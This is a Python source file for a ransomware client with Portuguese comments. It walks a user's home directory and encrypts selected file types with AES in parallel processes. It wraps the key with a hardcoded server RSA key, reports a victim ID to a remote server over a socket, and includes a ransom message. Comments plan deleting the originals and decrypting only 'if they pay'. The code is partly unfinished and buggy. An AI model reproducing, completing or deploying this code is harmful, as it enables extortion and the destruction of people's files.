#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import multiprocessing

from gera_chaves_RSA import *
from criptografa_descriptografa_arquivo_AES import *

'''

    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''




texto='''

    Bom dia, você foi vitma do Ransomware.

'''

# ponto de partida da criptografia
def menu():
    # caminho de partida
    home=os.environ['HOME']
    # lista com os tipos
    f=open('tipos_arquivos.txt','r')
    tipos=f.read()
    tipos=tipos.split('\n')
    # diretorios no caminho de partida
    diretorios=os.listdir(home)
    tam=len(diretorios)
    for a in range(tam):
        p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
        p.start()
        #p.join() -> em ordem # espera um terminar para começar outro
    listar('/home/tarcisio/.android',tipos,1)
    # CRIAR UMA THREAD PARA CADA DIRETORIO
    # CADA THREAD LISTAR DIRETORIO
    #retorno=listar(home,tipos)


def listar(diretorio, tipos_arq, modo):
    if(modo==1): # criptografa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                for ext in tipos_arq:
                    if(extensao[1]==ext):
                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                        criptografa(a)

    else: # descriptgrafa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                if(extensao[1]=='.cripto'):
                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                    descriptografa(a)


def client(IP_serv):

    porta=6064
    try:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.connect((IP_serv, porta))
    except socket.error as erro:
        print('Erro ocorrido: '+str(erro))
        return
    # conectado ao servidor
    print('enviando ID')
    mensagem='TESTE_ID'
    socket_obj.send(mensagem)
    #data = socket_obj.recv(1024) # recebeu do servidor a chave publica

def gera_chave_AES():
    # GERA SENHA AES que vai criptografar os arquivos
    # Salva senha em arquivo.txt
    tamanho=30
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    try:
        f=open('keys/AES.txt','w')
    except IOError:
        os.mkdir('keys')
        f=open('keys/AES.txt','w')
    f.write(senha)
    f.close()
    return senha

def criptografa_chave_AES(chave_publica_servidor):
    f=open('keys/AES.txt','r')
    chave_AES=f.read()
    retorno=cipher(chave_AES,chave_publica_servidor[0],chave_publica_servidor[1])
    f=open('keys/AES.txt','w')
    for elemento in retorno:
        f.write(str(elemento)+'\n')
    f.close()

def descriptografa_chave_AES():
    f=open('keys/AES.txt','r')
    of=open('keys/chave_publica.txt','r')
    ifo=open('keys/chave_privada.txt','r')
    chave_privada=ifo.readline()
    n_cliente=of.readline()
    chave_AES=f.read()

    # LISTA COM a chave criptografada
    chave_AES=chave_AES.split('\n')
    novo=[]
    for elemento in chave_AES:
        try:
            elemento=int(elemento)
            novo.append(elemento)
        except ValueError:
            pass
    AES_origin_key=descifra_AES(novo, n_cliente, chave_privada)
    print(AES_origin_key)


# MAIN
AES_key=gera_chave_AES()
print('chave AES gerada')
# chave publica servidor
serv_RSA=[1121,655]
# gera_chaves_RSA.py
valida()
print('chaves publicas e privada do cliente geradas')
#menu() # -> criptografa tudo
criptografa_chave_AES(serv_RSA)
descriptografa_chave_AES()
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
